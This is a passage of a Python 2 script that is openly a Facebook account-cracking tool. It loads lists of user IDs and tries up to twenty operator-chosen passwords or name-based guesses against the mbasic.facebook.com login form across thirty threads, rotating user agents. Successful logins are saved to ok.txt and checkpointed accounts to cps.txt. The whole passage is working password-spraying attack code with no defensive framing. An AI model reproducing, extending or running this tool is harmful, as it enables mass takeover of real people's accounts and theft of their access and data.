																																										print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps20+'\033[0;97m')
																																										ok = open('ok.txt', 'a')
																																										ok.write(uid+'|'+ps20+'\n')
																																										ok.close()
																																										oks.append(uid+ps20)
																																									else:
																																										if 'checkpoint' in sp:
																																											print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps20+'\033[0;97m')
																																											cp = open('cps.txt', 'a')
																																											cp.write(uid+'|'+ps20+'\n')
																																											cp.close()
																																											cps.append(uid+ps20)
																																										
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	print ("\x1b[1;96m[!]\x1b[1;93mProcess has been complete")
	print ("\x1b[1;96m[!]\x1b[1;92mTotal OK  "+str(len(oks)))
	print ("\x1b[1;96m[!]\x1b[1;91mTotal CP  "+str(len(cps)))
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	raw_input("\x1b[1;97mTo Go Back Press Enter  ")
	menu()
def choice():
	os.system("clear")
	print(logo)
	print("\x1b[1;97m-----------------------------------------------------")
	print("\x1b[1;91m [1]\x1b[1;97m Crack File With 5 Pass\x1b[0;90m  ")
	print("\x1b[1;91m [2]\x1b[1;97m Crack File With 10 Pass\x1b[0;90m ")
	print("\x1b[1;91m [3]\x1b[1;97m Crack File With 20 Pass\x1b[0;90m  ")
	print("\x1b[1;91m [0]\x1b[1;97m Back")
	print("\x1b[1;97m-----------------------------------------------------")
	choice_select()
def choice_select():
	select = raw_input("\x1b[1;97m☇ Select :  ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;96m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;96m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;96m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;96m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;96m[!]\x1b[1;97m Password5: ")
		filelist = raw_input("\x1b[1;96m[!]\x1b[1;97m File : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="2":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;96m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;96m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;96m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;96m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;96m[!]\x1b[1;97m Password5: ")
		ps6 = raw_input("\033[1;96m[!]\x1b[1;97m Password6: ")
		ps7 = raw_input("\033[1;96m[!]\x1b[1;97m Password7: ")
		ps8 = raw_input("\033[1;96m[!]\x1b[1;97m Password8: ")
		ps9 = raw_input("\033[1;96m[!]\x1b[1;97m Password9: ")
		ps10 = raw_input("\033[1;96m[!]\x1b[1;97m Password10: ")
		filelist = raw_input("\x1b[1;96m[!]\x1b[1;97m File : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="3":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;96m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;96m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;96m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;96m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;96m[!]\x1b[1;97m Password5: ")
		ps6 = raw_input("\033[1;96m[!]\x1b[1;97m Password6: ")
		ps7 = raw_input("\033[1;96m[!]\x1b[1;97m Password7: ")
		ps8 = raw_input("\033[1;96m[!]\x1b[1;97m Password8: ")
		ps9 = raw_input("\033[1;96m[!]\x1b[1;97m Password9: ")
		ps10 = raw_input("\033[1;96m[!]\x1b[1;97m Password10: ")
		ps11 = raw_input("\033[1;96m[!]\x1b[1;97m Password11: ")
		ps12 = raw_input("\033[1;96m[!]\x1b[1;97m Password12: ")
		ps13 = raw_input("\033[1;96m[!]\x1b[1;97m Password13: ")
		ps14 = raw_input("\033[1;96m[!]\x1b[1;97m Password14: ")
		ps15 = raw_input("\033[1;96m[!]\x1b[1;97m Password15: ")
		ps16 = raw_input("\033[1;96m[!]\x1b[1;97m Password16: ")
		ps17 = raw_input("\033[1;96m[!]\x1b[1;97m Password17: ")
		ps18 = raw_input("\033[1;96m[!]\x1b[1;97m Password18: ")
		ps19 = raw_input("\033[1;96m[!]\x1b[1;97m Password19: ")
		ps20 = raw_input("\033[1;96m[!]\x1b[1;97m Password20: ")
		filelist = raw_input("\x1b[1;96m[!]\x1b[1;97m File : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="0":
	    menu()
	else:
		print("\tSelect valid option\033[0;97m")
		choice_select()
	print''
	print(" \x1b[1;92m        Total ids in File :\x1b[1;96m "+str(len(id)))
	print(" \x1b[1;93m        Kindly Wait Cracking Started ...")
	print(" \x1b[1;97m------------------------------------------------------")
	print("\n")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		sharagent = random.choice(us)
		session = requests.Session()
		session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":sharagent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		host="https://mbasic.facebook.com"
		try:
			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps, 'login': 'submit'})
			sp = data.content
			if 'mbasic_logout_button' in sp or 'save-device' in sp:
				print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps+'\033[0;97m')
				ok = open('ok.txt', 'a')
				ok.write(uid+'|'+ps+'\n')
				ok.close()
				oks.append(uid+ps)
			else:
				if 'checkpoint' in sp:
					print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps+'\033[0;97m')
					cp = open('cps.txt', 'a')
					cp.write(uid+'|'+ps+'\n')
					cp.close()
					cps.append(uid+ps)
				else:
					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps2, 'login': 'submit'})
					sp = data.content
					if 'mbasic_logout_button' in sp or 'save-device' in sp:
						print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps2+'\033[0;97m')
						ok = open('ok.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
					else:
						if 'checkpoint' in sp:
							print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps2+'\033[0;97m')
							cp = open('cps.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
						else:
							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps3, 'login': 'submit'})
							sp = data.content
							if 'mbasic_logout_button' in sp or 'save-device' in sp:
								print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps3+'\033[0;97m')
								ok = open('ok.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
							else:
								if 'checkpoint' in sp:
									print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps3+'\033[0;97m')
									cp = open('cps.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
								else:
									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps4, 'login': 'submit'})
									sp = data.content
									if 'mbasic_logout_button' in sp or 'save-device' in sp:
										print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps4+'\033[0;97m')
										ok = open('ok.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
									else:
										if 'checkpoint' in sp:
											print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps4+'\033[0;97m')
											cp = open('cps.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
										else:
											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps5, 'login': 'submit'})
											sp = data.content
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps5+'\033[0;97m')
												ok = open('ok.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
											else:
												if 'checkpoint' in sp:
													print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps5+'\033[0;97m')
													cp = open('cps.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)
												else:
													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps6, 'login': 'submit'})
													sp = data.content
													if 'mbasic_logout_button' in sp or 'save-device' in sp:
														print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps6+'\033[0;97m')
														ok = open('ok.txt', 'a')
														ok.write(uid+'|'+ps6+'\n')
														ok.close()
														oks.append(uid+ps6)
													else:
														if 'checkpoint' in sp:
															print(' \033[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps6+'\033[0;97m')
															cp = open('cps.txt', 'a')
															cp.write(uid+'|'+ps6+'\n')
															cp.close()
															cps.append(uid+ps6)
														else:
															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps7, 'login': 'submit'})
															sp = data.content
															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps7+'\033[0;97m')
																ok = open('ok.txt', 'a')
																ok.write(uid+'|'+ps7+'\n')
																ok.close()
																oks.append(uid+ps7)
															else:
																if 'checkpoint' in sp:
																	print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps7+'\033[0;97m')
																	cp = open('cps.txt', 'a')
																	cp.write(uid+'|'+ps7+'\n')
																	cp.close()
																	cps.append(uid+ps7)
																else:
																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps8, 'login': 'submit'})
																	sp = data.content
																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																		print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps8+'\033[0;97m')
																		ok = open('ok.txt', 'a')
																		ok.write(uid+'|'+ps8+'\n')
																		ok.close()
																		oks.append(uid+ps8)
																	else:
																		if 'checkpoint' in sp:
																			print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps8+'\033[0;97m')
																			cp = open('cps.txt', 'a')
																			cp.write(uid+'|'+ps8+'\n')
																			cp.close()
																			cps.append(uid+ps8)
																		else:
																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps9, 'login': 'submit'})
																			sp = data.content
																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																				print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps9+'\033[0;97m')
																				ok = open('ok.txt', 'a')
																				ok.write(uid+'|'+ps9+'\n')
																				ok.close()
																				oks.append(uid+ps9)
																			else:
																				if 'checkpoint' in sp:
																					print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps9+'\033[0;97m')
																					cp = open('cps.txt', 'a')
																					cp.write(uid+'|'+ps9+'\n')
																					cp.close()
																					cps.append(uid+ps9)
																				else:
																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps10, 'login': 'submit'})
																					sp = data.content
																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																						print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps10+'\033[0;97m')
																						ok = open('ok.txt', 'a')
																						ok.write(uid+'|'+ps10+'\n')
																						ok.close()
																						oks.append(uid+ps10)
																					else:
																						if 'checkpoint' in sp:
																							print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps10+'\033[0;97m')
																							cp = open('cps.txt', 'a')
																							cp.write(uid+'|'+ps10+'\n')
																							cp.close()
																							cps.append(uid+ps10)
																						else:
																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps11, 'login': 'submit'})
																							sp = data.content
																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																								print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps11+'\033[0;97m')
																								ok = open('ok.txt', 'a')
																								ok.write(uid+'|'+ps11+'\n')
																								ok.close()
																								oks.append(uid+ps11)
																							else:
																								if 'checkpoint' in sp:
																									print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps11+'\033[0;97m')
																									cp = open('cps.txt', 'a')
																									cp.write(uid+'|'+ps11+'\n')
																									cp.close()
																									cps.append(uid+ps11)
																								else:
																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps12, 'login': 'submit'})
																									sp = data.content
																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																										print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps12+'\033[0;97m')
																										ok = open('ok.txt', 'a')
																										ok.write(uid+'|'+ps12+'\n')
																										ok.close()
																										oks.append(uid+ps12)
																									else:
																										if 'checkpoint' in sp:
																											print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps12+'\033[0;97m')
																											cp = open('cps.txt', 'a')
																											cp.write(uid+'|'+ps12+'\n')
																											cp.close()
																											cps.append(uid+ps12)
																										else:
																											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps13, 'login': 'submit'})
																											sp = data.content
																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																												print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps13+'\033[0;97m')
																												ok = open('ok.txt', 'a')
																												ok.write(uid+'|'+ps13+'\n')
																												ok.close()
																												oks.append(uid+ps13)
																											else:
																												if 'checkpoint' in sp:
																													print(' \033[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps13+'\033[0;97m')
																													cp = open('cps.txt', 'a')
																													cp.write(uid+'|'+ps13+'\n')
																													cp.close()
																													cps.append(uid+ps13)
																												else:
																													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps14, 'login': 'submit'})
																													sp = data.content
																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																														print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps14+'\033[0;97m')
																														ok = open('ok.txt', 'a')
																														ok.write(uid+'|'+ps14+'\n')
																														ok.close()
																														oks.append(uid+ps14)
																													else:
																														if 'checkpoint' in sp:
																															print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps14+'\033[0;97m')
																															cp = open('cps.txt', 'a')
																															cp.write(uid+'|'+ps14+'\n')
																															cp.close()
																															cps.append(uid+ps14)
																														else:
																															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps15, 'login': 'submit'})
																															sp = data.content
																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps15+'\033[0;97m')
																																ok = open('ok.txt', 'a')
																																ok.write(uid+'|'+ps15+'\n')
																																ok.close()
																																oks.append(uid+ps15)
																															else:
																																if 'checkpoint' in sp:
																																	print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps15+'\033[0;97m')
																																	cp = open('cps.txt', 'a')
																																	cp.write(uid+'|'+ps15+'\n')
																																	cp.close()
																																	cps.append(uid+ps15)
																																else:
																																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps16, 'login': 'submit'})
																																	sp = data.content
																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																		print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps16+'\033[0;97m')
																																		ok = open('ok.txt', 'a')
																																		ok.write(uid+'|'+ps16+'\n')
																																		ok.close()
																																		oks.append(uid+ps16)
																																	else:
																																		if 'checkpoint' in sp:
																																			print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps16+'\033[0;97m')
																																			cp = open('cps.txt', 'a')
																																			cp.write(uid+'|'+ps16+'\n')
																																			cp.close()
																																			cps.append(uid+ps16)
																																		else:
																																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps17, 'login': 'submit'})
																																			sp = data.content
																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																				print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps17+'\033[0;97m')
																																				ok = open('ok.txt', 'a')
																																				ok.write(uid+'|'+ps17+'\n')
																																				ok.close()
																																				oks.append(uid+ps17)
																																			else:
																																				if 'checkpoint' in sp:
																																					print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps17+'\033[0;97m')
																																					cp = open('cps.txt', 'a')
																																					cp.write(uid+'|'+ps17+'\n')
																																					cp.close()
																																					cps.append(uid+ps17)
																																				else:
																																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps18, 'login': 'submit'})
																																					sp = data.content
																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																						print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps18+'\033[0;97m')
																																						ok = open('ok.txt', 'a')
																																						ok.write(uid+'|'+ps18+'\n')
																																						ok.close()
																																						oks.append(uid+ps18)
																																					else:
																																						if 'checkpoint' in sp:
																																							print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps18+'\033[0;97m')
																																							cp = open('cps.txt', 'a')
																																							cp.write(uid+'|'+ps18+'\n')
																																							cp.close()
																																							cps.append(uid+ps18)
																																						else:
																																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps19, 'login': 'submit'})
																																							sp = data.content
																																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																								print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps19+'\033[0;97m')
																																								ok = open('ok.txt', 'a')
																																								ok.write(uid+'|'+ps19+'\n')
																																								ok.close()
																																								oks.append(uid+ps19)
																																							else:
																																								if 'checkpoint' in sp:
																																									print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps19+'\033[0;97m')
																																									cp = open('cps.txt', 'a')
																																									cp.write(uid+'|'+ps19+'\n')
																																									cp.close()
																																									cps.append(uid+ps19)
																																								else:
																																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps20, 'login': 'submit'})
																																									sp = data.content
																																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																										print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps20+'\033[0;97m')
																																										ok = open('ok.txt', 'a')
																																										ok.write(uid+'|'+ps20+'\n')
																																										ok.close()
																																										oks.append(uid+ps20)
																																									else:
																																										if 'checkpoint' in sp:
																																											print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps20+'\033[0;97m')
																																											cp = open('cps.txt', 'a')
																																											cp.write(uid+'|'+ps20+'\n')
																																											cp.close()
																																											cps.append(uid+ps20)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	print ("\x1b[1;96m[!]\x1b[1;93mProcess has been complete")
	print ("\x1b[1;96m[!]\x1b[1;92mTotal OK  "+str(len(oks)))
	print ("\x1b[1;96m[!]\x1b[1;91mTotal CP  "+str(len(cps)))
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	raw_input("\x1b[1;97mTo Go Back Press Enter  ")
	menu()
	
def namechoice():
	os.system("clear")
	print(logo)
	print("\x1b[1;97m-----------------------------------------------------")
	print("\x1b[1;96m [1]\x1b[1;97m Crack File [5 Pass]\x1b[0;90m")
	print("\x1b[1;96m [2]\x1b[1;97m Crack File [10 Pass]\x1b[0;90m")
	print("\x1b[1;96m [3]\x1b[1;97m Crack File [20 Pass]\x1b[0;90m")
	print("\x1b[1;96m [0]\x1b[1;97m Back")
	print("\x1b[1;97m-----------------------------------------------------")
	crack_bselect()
def crack_bselect():
	bselect = raw_input("\033[1;37m☇ select : \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if bselect =="1":
		os.system("clear")
		print(logo)
		bil1=raw_input(" FirstName + ")
		bil2=raw_input(" FirstName + ")
		bil3=raw_input(" FirstName + ")
		bil4=raw_input(" Password4 Digit : ")
		bil5=raw_input(" Password5 Digit : ")
		print 
		filelist = raw_input("\x1b[1;96m[!]\x1b[1;97m File Path : ")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print(" \033[1;37m File Not Found\033[0;98m")
			raw_input(" Press Enter To Back ")
			choicename()
	elif bselect =="2":
		os.system("clear")
		print(logo)
		bil1=raw_input(" FirstName + ")
		bil2=raw_input(" FirstName + ")
		bil3=raw_input(" FirstName + ")
		bil4=raw_input(" Password4 Digit :  ")
		bil5=raw_input(" Password5 Digit :  ")
		bil6=raw_input(" FirstName + ")
		bil7=raw_input(" FirstName + ")
		bil8=raw_input(" FirstName + ")
		bil9=raw_input(" Password9 Digit :  ")
		bil10=raw_input(" Password10 Digit :  ")
		os.system("clear")
		print(logo)
		print 
		filelist = raw_input("\x1b[1;96m[!]\x1b[1;97m File Path : ")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print(" \033[1;37m File Not Found\033[0;98m")
			raw_input(" Press Enter To Back ")
			choicename()
	elif bselect =="3":
		os.system("clear")
		print(logo)
		bil1=raw_input(" FirstName + ")
		bil2=raw_input(" FirstName + ")
		bil3=raw_input(" FirstName + ")
		bil4=raw_input(" Password4 Digit :  ")
		bil5=raw_input(" Password5 Digit : ")
		bil6=raw_input(" FirstName + ")
		bil7=raw_input(" FirstName + ")
		bil8=raw_input(" FirstName + ")
		bil9=raw_input(" Password9 Digit : ")
		bil10=raw_input(" Password10 Digit : ")
		bil11=raw_input(" FirstName + ")
		bil12=raw_input(" FirstName + ")
		bil13=raw_input(" FirstName + ")
		bil14=raw_input(" Password14 Digit :  ")
		bil15=raw_input(" Password15 Digit : ")
		bil16=raw_input(" FirstName + ")
		bil17=raw_input(" FirstName + ")
		bil18=raw_input(" FirstName + ")
		bil19=raw_input(" Password19 Digit : ")
		bil20=raw_input(" Password20 Digit : ")
		os.system("clear")
		print(logo)
		print 
		filelist = raw_input("\x1b[1;96m[!]\x1b[1;97m File Path : ")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print(" \033[1;37m File Not Found\033[0;98m")
			raw_input(" Press Enter To Back ")
			choicename()
	elif bselect =="0":
	    menu()
	else:
		print("\nWrong Input !\033[0;97m")
		choice_bselect()
	print''
	print(" \x1b[1;92m        Total ids in File :\x1b[1;96m "+str(len(id)))
	print(" \x1b[1;93m        Kindly Wait Cracking Started ...")
	print(" \x1b[1;97m-----------------------------------------------------")
	print("\n")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		sharagent = random.choice(us)
		session = requests.Session()
		session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":sharagent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		host="https://mbasic.facebook.com"
		try:
			ps = name + bil1
			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps, 'login': 'submit'})
			sp = data.content
			if 'mbasic_logout_button' in sp or 'save-device' in sp:
				print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps+'\033[0;97m')
				ok = open('ok.txt', 'a')
				ok.write(uid+'|'+ps+'\n')
				ok.close()
				oks.append(uid+ps)
			else:
				if 'checkpoint' in sp:
					print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps+'\033[0;97m')
					cp = open('cps.txt', 'a')
					cp.write(uid+'|'+ps+'\n')
					cp.close()
					cps.append(uid+ps)
				else:
					ps2 = name + bil2
					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps2, 'login': 'submit'})
					sp = data.content
					if 'mbasic_logout_button' in sp or 'save-device' in sp:
						print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps2+'\033[0;97m')
						ok = open('ok.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
					else:
						if 'checkpoint' in sp:
							print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps2+'\033[0;97m')
							cp = open('cps.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
						else:
							ps3 = name + bil3
							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps3, 'login': 'submit'})
							sp = data.content
							if 'mbasic_logout_button' in sp or 'save-device' in sp:
								print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps3+'\033[0;97m')
								ok = open('ok.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
							else:
								if 'checkpoint' in sp:
									print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps3+'\033[0;97m')
									cp = open('cps.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
								else:
									ps4 = bil4
									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps4, 'login': 'submit'})
									sp = data.content
									if 'mbasic_logout_button' in sp or 'save-device' in sp:
										print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps4+'\033[0;97m')
										ok = open('ok.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
									else:
										if 'checkpoint' in sp:
											print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps4+'\033[0;97m')
											cp = open('cps.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
										else:
											ps5 = bil5
											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps5, 'login': 'submit'})
											sp = data.content
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps5+'\033[0;97m')
												ok = open('ok.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
											else:
												if 'checkpoint' in sp:
													print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps5+'\033[0;97m')
													cp = open('cps.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)
												else:
													ps6 = name + bil6
													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps6, 'login': 'submit'})
													sp = data.content
													if 'mbasic_logout_button' in sp or 'save-device' in sp:
														print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps6+'\033[0;97m')
														ok = open('ok.txt', 'a')
														ok.write(uid+'|'+ps6+'\n')
														ok.close()
														oks.append(uid+ps6)
													else:
														if 'checkpoint' in sp:
															print(' \033[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps6+'\033[0;97m')
															cp = open('cps.txt', 'a')
															cp.write(uid+'|'+ps6+'\n')
															cp.close()
															cps.append(uid+ps6)
														else:
															ps7 = name + bil7
															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps7, 'login': 'submit'})
															sp = data.content
															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps7+'\033[0;97m')
																ok = open('ok.txt', 'a')
																ok.write(uid+'|'+ps7+'\n')
																ok.close()
																oks.append(uid+ps7)
															else:
																if 'checkpoint' in sp:
																	print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps7+'\033[0;97m')
																	cp = open('cps.txt', 'a')
																	cp.write(uid+'|'+ps7+'\n')
																	cp.close()
																	cps.append(uid+ps7)
																else:
																	ps8 = name + bil8
																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps8, 'login': 'submit'})
																	sp = data.content
